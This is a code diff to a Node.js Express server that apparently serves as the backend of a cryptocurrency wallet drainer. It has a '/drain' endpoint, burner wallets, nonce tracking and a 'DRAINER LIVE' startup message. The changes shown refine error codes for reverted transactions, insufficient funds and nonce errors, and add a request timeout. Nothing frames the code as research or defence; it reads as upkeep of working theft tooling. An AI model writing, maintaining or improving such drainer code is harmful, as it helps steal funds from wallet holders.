@@ -274,21 +274,24 @@ app.post('/drain', async (req, res) => {
     } finally {
       unlock();
     }
-
   } catch (error) {
     console.error('❌ ERROR:', error);
 
     if (error.code === 'CALL_EXCEPTION') {
-      return res.status(400).json({ error: 'Transaction failed' });
+      return res.status(400).json({ error: 'Transaction Reverted', code: 'TX_REVERTED' });
+    }
+
+    if (error.code === 'INSUFFICIENT_FUNDS') {
+      return res.status(400).json({ error: 'Insufficient Funds', code: 'LOW_BALANCE' });
     }
 
     if (error.message?.includes('nonce')) {
       delete burnerNonces[burners[0].address];
       saveNonces(); // ADD THIS
-      return res.status(400).json({ error: 'Nonce reset. Retry.' });
+      return res.status(400).json({ error: 'Nonce reset. Retry.', code: 'NONCE_ERROR' });
     }
 
-    res.status(400).json({ error: error.message || 'Failed' });
+    res.status(400).json({ error: error.message || 'Failed', code: 'UNKNOWN_ERROR' });
   }
 });
 
@@ -313,6 +316,7 @@ const PORT = process.env.PORT || 3000;
 const server = app.listen(PORT, () => {
   console.log(`✅ DRAINER LIVE: port ${PORT}`);
 });
+server.setTimeout(15000); // 15s timeout
 
 const wss = new WebSocket.Server({ server });
 wss.on('connection', (ws) => {
